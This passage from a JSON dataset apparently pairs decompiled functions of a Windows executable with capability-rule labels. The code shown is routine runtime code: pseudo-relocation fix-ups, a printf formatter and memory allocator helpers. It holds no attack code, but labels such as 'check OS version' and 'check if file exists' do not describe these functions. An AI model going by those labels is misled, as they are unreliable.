ppuStack168 = arg1;\n    fcn.14000e620();\n    auStack264[2] = 0x14000dd1e;\n    iVar12 = fcn.14000e880(arg1_00);\n    iVar17 = *0x140103640;\n    puVar7 = *0x1401035f0;\n    *0x1401290c4 = 0;\n    iVar12 = -iVar12;\n    *0x1401290c8 = auStack192 + iVar12;\n    if (*0x1401035f0 - *0x140103600 < 8) {\n        *0x1401290c4 = 0;\n        return;\n    }\n    puVar16 = *0x140103600;\n    if (*0x1401035f0 - *0x140103600 < 0xc) {\ncode_r0x00014000dd5d:\n        if (*puVar16 == 0) {\n            uVar20 = puVar16[1];\ncode_r0x00014000dd6a:\n            if (uVar20 == 0) {\n                arg2 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x00014000e00e:\n                    uVar14 = 0x40102260;\n                    *(auStack264 + iVar12 + 0x10) = 0x14000e01a;\n                    fcn.14000dae0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, in_R8, in_R9);\n                    if (*0x1401290d0 != NULL) {\n                        uVar5 = *(apuStack208 + iVar12 + 8);\n                        *(auStack296 + iVar12) = uVar14;\n                        *(&uStack288 + iVar12) = arg2;\n                        *(auStack280 + iVar12) = CONCAT88(in_XMM3_Qa, in_XMM2_Qa);\n                        *(auStack264 + iVar12) = uVar5;\n                        *(auStack336 + iVar12) = 0x14000e058;\n                        (**0x1401290d0)(auStack296 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x1401035f0 <= puVar16) {\n                    *0x1401290c4 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar20 = puVar16[2];\n                        ppuVar10 = *puVar16 + iVar17;\n                        arg2 = uVar20;\n                        in_R9 = *ppuVar10;\n                        arg1_01 = puVar16[1] + iVar17;\n                        if ((uVar20 & 0xff) == 0x20) goto code_r0x00014000df38;\n                        uVar15 = uVar20 & 0xff;\n                        if ((uVar20 & 0xff) < 0x21) break;\n                        if (uVar15 != 0x40) {\ncode_r0x00014000e002:\n                            *(auStack264 + iVar12 + 0x10) = 0x14000e00e;\n                            fcn.14000dae0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, in_R8, in_R9);\n                            goto code_r0x00014000e00e;\n                        }\n                        puVar19 = (*arg1_01 - ppuVar10) + in_R9;\n                        if (((uVar20 & 0xc0) == 0) && (-1 < puVar19)) goto code_r0x00014000df1f;\n                        *(auStack264 + iVar12 + 0x10) = 0x14000df88;\n                        fcn.14000db50(arg1_01);\n                        *arg1_01 = puVar19;\ncode_r0x00014000dde5:\n                        puVar16 = puVar16 + 3;\n                        if (puVar7 <= puVar16) goto code_r0x00014000de80;\n                    }\n                    if (uVar15 == 8) {\n                        uVar2 = *arg1_01;\n                        if (uVar2 < '\\0') {\n                            iVar18 = (uVar2 | 0xffffffffffffff00) - ppuVar10;\n                        }\n                        else {\n                            iVar18 = uVar2 - ppuVar10;\n                        }\n                        puVar19 = iVar18 + in_R9;\n                        if (((uVar20 & 0xc0) == 0) && ((0xff < puVar19 || (puVar19 < -0x80)))) {\ncode_r0x00014000df1f:\n                            do {\n                                *(apuStack208 + iVar12) = puVar19;\n                                uVar20 = 0x401022c8;\n                                *(auStack264 + iVar12 + 0x10) = 0x14000df33;\n                                in_R8 = arg1_01;\n                                ppuVar10 = fcn.14000dae0(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                         , arg2, arg1_01, in_R9);\ncode_r0x00014000df38:\n                                uVar15 = *arg1_01;\n                                if (uVar15 < 0) {\n                                    iVar18 = (uVar15 | 0xffffffff00000000) - ppuVar10;\n                                }\n                                else {\n                                    iVar18 = uVar15 - ppuVar10;\n                                }\n                                puVar19 = iVar18 + in_R9;\n                            } while (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x80000000 || (0xffffffff < puVar19))));\n                            *(auStack264 + iVar12 + 0x10) = 0x14000df72;\n                            fcn.14000db50(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        else {\n                            *(auStack264 + iVar12 + 0x10) = 0x14000dde2;\n                            fcn.14000db50(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        goto code_r0x00014000dde5;\n                    }\n                    if (uVar15 != 0x10) goto code_r0x00014000e002;\n                    uVar3 = *arg1_01;\n                    if (uVar3 < 0) {\n                        iVar18 = (uVar3 | 0xffffffffffff0000) - ppuVar10;\n                    }\n                    else {\n                        iVar18 = uVar3 - ppuVar10;\n                    }\n                    puVar19 = iVar18 + in_R9;\n                    if (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x8000 || (0xffff < puVar19))))\n                    goto code_r0x00014000df1f;\n                    puVar16 = puVar16 + 3;\n                    *(auStack264 + iVar12 + 0x10) = 0x14000de6c;\n                    fcn.14000db50(arg1_01);\n                    *arg1_01 = puVar19;\n                } while (puVar16 < puVar7);\n                goto code_r0x00014000de80;\n            }\n        }\n    }\n    else if (**0x140103600 == 0) {\n        uVar20 = (*0x140103600)[1];\n        if ((uVar20 | (*0x140103600)[2]) == 0) {\n            puVar16 = *0x140103600 + 3;\n            goto code_r0x00014000dd5d;\n        }\n        goto code_r0x00014000dd6a;\n    }\n    if (*0x1401035f0 <= puVar16) {\n        *0x1401290c4 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar20 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar13 = *puVar1 + iVar17;\n        iVar4 = *piVar13;\n        *(auStack264 + iVar12 + 0x10) = 0x14000dff6;\n        fcn.14000db50(piVar13);\n        *piVar13 = uVar20 + iVar4;\n    } while (puVar16 < puVar7);\ncode_r0x00014000de80:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x1401290c4) {\n        iVar17 = 0;\n        do {\n            piVar13 = *0x1401290c8 + iVar17;\n            iVar4 = *piVar13;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar13 + 4);\n                uVar6 = *(piVar13 + 2);\n                *(auStack264 + iVar12 + 0x10) = 0x14000debf;\n                (*pcVar8)(uVar6, uVar5, iVar4, auStack180);\n            }\n            iVar9 = iVar9 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar9 < *0x1401290c4);\n    }\n    return;\n}\n",
        "token_count": 3223
    },
    "140013a7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.140013a70(ulong arg1, int64_t arg2, ulong arg3, char *arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint *puVar5;\n    ulong arg1_00;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    float10 *pfVar9;\n    int16_t iVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint16_t uVar13;\n    uint8_t *puVar14;\n    uint8_t *puVar15;\n    char16_t *arg1_01;\n    uint8_t *puVar16;\n    int32_t iVar17;\n    int32_t *piVar18;\n    float10 fVar19;\n    float10 **in_stack_00000028;\n    uint64_t uStack200;\n    uint16_t uStack192;\n    unkbyte6 Stack190;\n    float10 afStack168 [3];\n    ushort uStack138;\n    float10 *apfStack136 [2];\n    int64_t iStack120;\n    uint32_t uStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    ushort uStack96;\n    int32_t iStack92;\n    ushort uStack88;\n    uint32_t uStack84;\n    int32_t iStack80;\n    uint uStack76;\n    \n    puVar5 = sub.msvcrt.dll__errno();\n    uVar7 = *arg4;\n    arg1._0_4_ = arg1 & 0x6000;\n    uVar1 = *puVar5;\n    iStack80 = arg3;\n    puVar14 = arg4 + 1;\n    iStack104 = -1;\n    uStack100 = 0xfffffffd;\n    uStack96 = 0;\n    iStack108 = -1;\n    iStack92 = 0;\n    uStack88 = 0;\n    uStack84 = 0;\n    uStack76 = 0xffffffff;\n    if (*arg4 == '\\0') {\n        return uVar7;\n    }\n    iStack120 = arg2;\n    uStack112 = arg1;\n    uVar8 = uVar7;\ncode_r0x000140013b6e:\n    uVar3 = uStack84;\n    if (uVar7 == 0x25) {\n        uVar4 = *puVar14;\n        iStack108 = -1;\n        iStack104 = -1;\n        if (uVar4 == 0) {\n            return uStack84;\n        }\n        iVar17 = 0;\n        uVar7 = 0;\n        puVar15 = puVar14;\n        piVar18 = &iStack108;\n        uStack112 = arg1;\n        do {\n            puVar16 = puVar15 + 1;\n            uVar8 = uVar4;\n    // switch table (91 cases) at 0x1401026a0\n            switch(uVar4) {\n            case 0x20:\n                if (uVar7 != 0) goto code_r0x000140013c10;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x40;\n                break;\n            default:\n                if ((9 < uVar4 - 0x30) || (3 < uVar7)) {\ncode_r0x000140013de7:\n                    fcn.140012060(0x25, &iStack120);\n                    puVar16 = puVar14;\n                    goto code_r0x000140013b5c;\n                }\n                if (uVar7 == 0) {\n                    uVar7 = 1;\n                }\n                else {\ncode_r0x000140014329:\n                    if (uVar7 == 2) {\n                        uVar7 = 3;\n                    }\n                }\n                if (piVar18 != NULL) {\n                    if (*piVar18 < 0) {\n                        uVar4 = puVar15[1];\n                        *piVar18 = uVar8 - 0x30;\n                        break;\n                    }\n                    *piVar18 = (uVar8 - 0x30) + *piVar18 * 10;\n                }\ncode_r0x000140013c10:\n                uVar4 = puVar15[1];\n                break;\n            case 0x23:\n                if (uVar7 != 0) goto code_r0x000140013c10;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x800;\n                break;\n            case 0x25:\n                goto code_r0x00014001418a;\n            case 0x27:\n                if (uVar7 != 0) goto code_r0x000140013c10;\n                uStack112 = uStack112 | 0x1000;\n                apfStack136[0] = apfStack136[0] & 0xffffffff00000000;\n                iVar6 = sub.msvcrt.dll_localeconv();\n                iStack92 = fcn.140018310(&uStack138, *(iVar6 + 8), 0x10, apfStack136);\n                if (0 < iStack92) {\n                    uStack88 = uStack138;\n                }\n                uVar4 = puVar15[1];\n                break;\n            case 0x2a:\n                if (piVar18 == NULL) {\ncode_r0x000140013fe9:\n                    uVar4 = puVar15[1];\n                    uVar7 = 4;\n                }\n                else if ((uVar7 & 0xfffffffd) == 0) {\n                    iVar2 = *in_stack_00000028;\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                    *piVar18 = iVar2;\n                    if (iVar2 < 0) {\n                        if (uVar7 != 0) {\n                            uVar4 = puVar15[1];\n                            piVar18 = NULL;\n                            iStack104 = -1;\n                            uVar7 = 2;\n                            break;\n                        }\n                        uStack112 = uStack112 | 0x400;\n                        iStack108 = -iStack108;\n                    }\n                    uVar4 = puVar15[1];\n                    piVar18 = NULL;\n                }\n                else {\n                    uVar4 = puVar15[1];\n                    piVar18 = NULL;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x2b:\n                if (uVar7 != 0) goto code_r0x000140013c10;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x100;\n                break;\n            case 0x2d:\n                if (uVar7 != 0) goto code_r0x000140013c10;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x400;\n                break;\n            case 0x2e:\n                if (1 < uVar7) goto code_r0x000140013fe9;\n                uVar4 = puVar15[1];\n                uVar7 = 2;\n                iStack104 = 0;\n                piVar18 = &iStack104;\n                break;\n            case 0x30:\n                if (uVar7 != 0) {\n                    if (uVar7 != 4) {\n                        uVar8 = 0x30;\n                        goto code_r0x000140014329;\n                    }\n                    goto code_r0x000140013de7;\n                }\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x200;\n                break;\n            case 0x41:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140013e2e;\ncode_r0x000140014028:\n                uVar7 = pfVar9;\n                uVar8 = pfVar9 >> 0x20;\n                if (((-uVar7 | uVar7) >> 0x1f | uVar8 & 0x7fffffff) < 0x7ff00001) {\n                    fVar19 = pfVar9;\n                    uStack200 = SUB108(fVar19, 0);\n                    uStack192 = fVar19 >> 0x40;\n                    uVar12 = CONCAT62(Stack190, uStack192);\n                    if (fVar19 < 0) {\n                        uStack112 = uStack112 | 0x80;\n                    }\n                    uVar7 = uVar8 & 0xfffff | uVar7;\n                    if ((uVar7 == 0 && (uVar8 & 0x7ff00000) == 0x7ff00000) && ((uVar7 | uVar8 & 0x7ff00000) != 0)) {\n                        fcn.1400123f0(uVar12 & 0x8000, 0x14010269a, &iStack120);\n                        goto code_r0x000140013f40;\n                    }\n                    uVar11 = uVar12 & 0xffffffffffff7fff;\n                    if ((fVar19 & 0x7fff) == 0) {\ncode_r0x0001400143b9:\n                        uVar12 = uVar12 & 0xffff7fff;\n                        if (uStack200 != 0) {\n                            uVar12 = 0xfffffc05;\n                        }\n                    }\n                    else {\n                        iVar10 = uVar11;\n                        if (iVar10 == 0x3c00 || SBORROW2(uStack192 & 0x7fff, 0x3c00) != iVar10 + -0x3c00 < 0) {\n                            uStack200 = uStack200 >> (0x3c01 - iVar10 & 0x3f);\n                            uVar11 = uVar11 + (0x3c01 - iVar10);\n                        }\n                        else if (iVar10 == 0) goto code_r0x0001400143b9;\n                        uVar12 = uVar11 & 0xffffffffffff0000 | uVar11 + 0xc004;\n                    }\n                    uStack200 = uStack200 >> 3;\n                    goto code_r0x0001400142c7;\n                }\ncode_r0x00014001433b:\n                fcn.1400123f0(0, 0x140102696, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x43:\n                goto code_r0x0001400140cf;\n            case 0x45:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140013f91;\ncode_r0x000140014107:\n                afStack168[0] = pfVar9;\n                fcn.1400132d0(afStack168, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x46:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140013f63;\ncode_r0x000140014138:\n                afStack168[0] = pfVar9;\n                fcn.140013370(afStack168, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x47:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140013f2b;\ncode_r0x000140014169:\n                afStack168[0] = pfVar9;\n                fcn.140013450(afStack168, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x49:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x36) {\n                    if (puVar15[2] != 0x34) goto code_r0x000140013de7;\n                    uVar4 = puVar15[3];\n                    iVar17 = 3;\n                    puVar16 = puVar15 + 3;\n                    uVar7 = 4;\n                }\n                else if (uVar4 == 0x33) {\n                    if (puVar15[2] != 0x32) goto code_r0x000140013de7;\n                    uVar4 = puVar15[3];\n                    iVar17 = 2;\n                    puVar16 = puVar15 + 3;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 3;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x4c:\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 4;\n                uVar7 = 4;\n                break;\n            case 0x53:\ncode_r0x0001400142da:\n                arg1_01 = *in_stack_00000028;\n                if (arg1_01 == NULL) {\n                    arg1_01 = L\"(null)\";\n                }\n                if (iStack104 < 0) {\n                    uVar7 = sub.msvcrt.dll_wcslen(arg1_01);\n                    fcn.1400120c0(arg1_01, uVar7, &iStack120);\n                }\n                else {\n                    uVar7 = fcn.140017db0(arg1_01, iStack104);\n                    fcn.1400120c0(arg1_01, uVar7, &iStack120);\n                }\n                goto code_r0x000140013f09;\n            case 0x58:\n            case 0x6f:\n            case 0x75:\n            case 0x78:\n                uStack112 = uStack112 & 0xfffffeff;\n                if (iVar17 == 3) {\n                    apfStack136[0] = *in_stack_00000028;\n                }\n                else if (iVar17 == 2) {\n                    apfStack136[0] = *in_stack_00000028;\n                }\n                else {\n                    uVar7 = *in_stack_00000028;\n                    if (iVar17 == 1) {\n                        apfStack136[0] = uVar7 & 0xffff;\n                    }\n                    else {\n                        apfStack136[0] = uVar7 & 0xff;\n                        if (iVar17 != 5) {\n                            apfStack136[0] = uVar7;\n                        }\n                    }\n                }\n                if (uVar8 == 0x75) {\n                    fcn.140012940(apfStack136[0], &iStack120);\n                }\n                else {\n                    fcn.140012490(uVar8, apfStack136[0], &iStack120);\n                }\n                goto code_r0x000140013f40;\n            case 0x61:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140014028;\ncode_r0x000140013e2e:\n                uVar7 = *(pfVar9 + 8);\n                uStack200 = *pfVar9;\n                uVar13 = uVar7;\n                uVar8 = uStack200 >> 0x20 & 0x7fffffff | uStack200;\n                if (0xfffe - ((-uVar8 | uVar8) >> 0x1f | uVar13 * 2 & 0xffffU) >> 0x10 != 0) goto code_r0x00014001433b;\n                if (uVar13 < 0) {\n                    uStack112 = uStack112 | 0x80;\n                }\n                uVar12 = uVar7 & 0xffffffffffff7fff;\n                if ((uVar7 & 0x7fff) == 0) {\n                    if (uStack200 != 0) {\n                        uVar12 = 0xffffc002;\n                    }\n                }\n                else {\n                    if (((uVar13 & 0x7fff) == 0x7fff) && (uVar8 == 0)) {\n                        fcn.1400123f0(uVar13 & 0x8000, 0x14010269a, &iStack120);\n                        goto code_r0x000140013f40;\n                    }\n                    uVar12 = uVar7 & 0xffffffffffff0000 | uVar12 + 0xc001;\n                }\ncode_r0x0001400142c7:\n                fcn.1400135d0(uStack200, uVar12, &iStack120);\n                goto code_r0x000140013f40;\n            case 99:\n                iStack104 = -1;\n                if (iVar17 - 2U < 2) {\ncode_r0x0001400140cf:\n                    iStack104 = -1;\n                    apfStack136[0] = apfStack136[0] & 0xffffffffffff0000 | *in_stack_00000028;\n                    fcn.1400120c0(apfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                else {\n                    apfStack136[0] = apfStack136[0] & 0xffffffffffffff00 | *in_stack_00000028;\n                    fcn.140012250(apfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                goto code_r0x000140013b5c;\n            case 100:\n            case 0x69:\n                uStack112 = uStack112 | 0x80;\n                if (iVar17 == 3) {\n                    pfVar9 = *in_stack_00000028;\n                }\n                else {\n                    iVar2 = *in_stack_00000028;\n                    pfVar9 = iVar2;\n                    if (iVar17 != 2) {\n                        if (iVar17 == 1) {\n                            pfVar9 = iVar2;\n                        }\n                        else if (iVar17 == 5) {\n                            pfVar9 = iVar2;\n                        }\n                    }\n                }\n                fcn.140012940(pfVar9, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140013b5c;\n            case 0x65:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140014107;\ncode_r0x000140013f91:\n                afStack168[0] = *pfVar9;\n                fcn.1400132d0(afStack168, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x66:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140014138;\ncode_r0x000140013f63:\n                afStack168[0] = *pfVar9;\n                fcn.140013370(afStack168, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x67:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140014169;\ncode_r0x000140013f2b:\n                afStack168[0] = *pfVar9;\n                fcn.140013450(afStack168, &iStack120);\n                goto code_r0x000140013f40;\n            case 0x68:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x68) {\n                    uVar4 = puVar15[2];\n                    iVar17 = 5;\n                    puVar16 = puVar15 + 2;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 1;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x6a:\n            case 0x74:\n            case 0x7a:\n                uVar4 = puVar15[1];\n                iVar17 = 3;\n                uVar7 = 4;\n                break;\n            case 0x6c:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x6c) {\n                    uVar4 = puVar15[2];\n                    iVar17 = 3;\n                    puVar16 = puVar15 + 2;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 2;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x6d:\n                arg1_00 = sub.msvcrt.dll_strerror(uVar1);\n                fcn.1400123a0(arg1_00, &iStack120);\n                goto code_r0x000140013b5c;\n            case 0x6e:\n                pfVar9 = *in_stack_00000028;\n                if (iVar17 == 5) {\n                    *pfVar9 = uStack84;\n                }\n                else if (iVar17 == 1) {\n                    *pfVar9 = uStack84;\n                }\n                else if ((iVar17 == 2) || (iVar17 != 3)) {\n                    *pfVar9 = uStack84;\n                }\n                else {\n                    *pfVar9 = uStack84;\n                }\ncode_r0x000140013f40:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140013b5c;\n            case 0x70:\n                if ((uVar7 == 0) && (uStack112 == arg1)) {\n                    iStack104 = 0x10;\n                    uStack112 = arg1 | 0x200;\n                }\n                fcn.140012490(0x78, *in_stack_00000028, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140013b5c;\n            case 0x73:\n                if (iVar17 - 2U < 2) goto code_r0x0001400142da;\n                fcn.1400123a0(*in_stack_00000028, &iStack120);\ncode_r0x000140013f09:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140013b5c;\n            }\n            puVar15 = puVar16;\n            if (uVar4 == 0) {\n                return uStack84;\n            }\n        } while( true );\n    }\n    if (((uStack112 & 0x4000) != 0) || (uStack84 < iStack80)) {\n        if ((uStack112 & 0x2000) == 0) {\n            *(iStack120 + uStack84) = uVar8;\n        }\n        else {\n            sub.msvcrt.dll_fputc();\n        }\n    }\n    uStack84 = uVar3 + 1;\n    puVar16 = puVar14;\n    goto code_r0x000140013b5c;\ncode_r0x00014001418a:\n    fcn.140012060(0x25, &iStack120);\ncode_r0x000140013b5c:\n    uVar8 = *puVar16;\n    puVar14 = puVar16 + 1;\n    uVar7 = *puVar16;\n    if (uVar7 == 0) {\n        return uStack84;\n    }\n    goto code_r0x000140013b6e;\n}\n",
        "token_count": 5448
    },
    "14001707": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140017070(ulong *arg1)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    if (arg1 != NULL) {\n        if (9 < *(arg1 + 1)) {\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.140016e50(0);\n        bVar2 = *0x140129c30 == 2;\n        uVar1 = *(*(arg1 + 1) * 8 + 0x140129be0);\n        *(*(arg1 + 1) * 8 + 0x140129be0) = arg1;\n        *arg1 = uVar1;\n        if (bVar2) {\n    // WARNING: Could not recover jumptable at 0x0001400170cc. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129c40);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "140016f8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140016f80(ulong arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    \n    fcn.140016e50(0);\n    iVar2 = *0x140129c30;\n    if (arg1 < 10) {\n        puVar3 = *(arg1 * 8 + 0x140129be0);\n        if (puVar3 != NULL) {\n            *(arg1 * 8 + 0x140129be0) = *puVar3;\n            goto joined_r0x000140017005;\n        }\n        iVar5 = 1 << (arg1 & 0x1f);\n        uVar1 = (iVar5 + 9) * 4 - 1;\n        uVar4 = uVar1 >> 3;\n        if (0x120 < (*0x1400f94d0 + -0x2802525c >> 3) + uVar4) goto code_r0x000140016fea;\n        puVar3 = *0x1400f94d0;\n        *0x1400f94d0 = *0x1400f94d0 + (uVar1 & 0xfffffffffffffff8);\n    }\n    else {\n        iVar5 = 1 << (arg1 & 0x1f);\n        uVar4 = iVar5 * 4 + 0x23U >> 3 & 0xffffffff;\ncode_r0x000140016fea:\n        puVar3 = sub.msvcrt.dll_malloc(uVar4 << 3);\n        if (puVar3 == NULL) {\n            return;\n        }\n    }\n    iVar2 = *0x140129c30;\n    *(puVar3 + 1) = arg1;\n    *(puVar3 + 0xc) = iVar5;\njoined_r0x000140017005:\n    if (iVar2 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129c40);\n    }\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 474
    },
    "1400171a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400171a0(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    fcn.140016e50(0);\n    if (*0x140129be8 == NULL) {\n        if ((*0x1400f94d0 + -0x2802525c >> 3) + 5U < 0x121) {\n            puVar3 = *0x1400f94d0;\n            *0x1400f94d0 = *0x1400f94d0 + 5;\n        }\n        else {\n            puVar3 = sub.msvcrt.dll_malloc(0x28);\n            if (puVar3 == NULL) {\n                return;\n            }\n        }\n        iVar1 = *0x140129c30;\n        puVar3[1] = *0x140102a08;\n    }\n    else {\n        puVar3 = *0x140129be8;\n        *0x140129be8 = **0x140129be8;\n        iVar1 = *0x140129c30;\n    }\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129c40);\n    }\n    uVar2 = *0x140102a10;\n    *(puVar3 + 3) = arg1;\n    puVar3[2] = uVar2;\n    return;\n}\n",
        "token_count": 323
    },
    "1400173c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.1400173c0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong *arg2_00;\n    \n    if (((arg2 & 3) == 0) || (arg1 = fcn.1400170e0(arg1, *(((arg2 & 3) - 1) * 4 + 0x1401028c0), 0),  arg1 != 0)) {\n        arg2._0_4_ = arg2 >> 2;\n        if (arg2 != 0) {\n            puVar3 = *0x1401292c0;\n            if (*0x1401292c0 == NULL) {\n                fcn.140016e50(1);\n                puVar3 = *0x1401292c0;\n                if (*0x1401292c0 == NULL) {\n                    puVar3 = fcn.140016f80(1);\n                    if (puVar3 == NULL) {\n                        *0x1401292c0 = NULL;\n                        return 0;\n                    }\n                    *0x1401292c0 = puVar3;\n                    *(puVar3 + 0x14) = 0x27100000001;\n                    *puVar3 = 0;\n                }\n                if (*0x140129c30 == 2) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129c68);\n                }\n            }\n            while( true ) {\n                arg2_00 = puVar3;\n                uVar1 = arg2 & 1;\n                arg2._0_4_ = arg2 >> 1;\n                if (uVar1 != 0) {\n                    iVar2 = fcn.140017260(arg1, arg2_00);\n                    if (iVar2 == 0) goto code_r0x0001400174b3;\n                    fcn.140017070(arg1);\n                    arg1 = iVar2;\n                }\n                if (arg2 == 0) break;\n                puVar3 = *arg2_00;\n                if (*arg2_00 == NULL) {\n                    fcn.140016e50(1);\n                    puVar3 = *arg2_00;\n                    if (puVar3 == NULL) {\n                        puVar3 = fcn.140017260(arg2_00, arg2_00);\n                        *arg2_00 = puVar3;\n                        if (puVar3 == NULL) goto code_r0x0001400174b3;\n                        *puVar3 = 0;\n                    }\n                    if (*0x140129c30 == 2) {\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140129c68);\n                    }\n                }\n            }\n        }\n    }\n    else {\ncode_r0x0001400174b3:\n        arg1 = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 651
    },
    "1400195f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
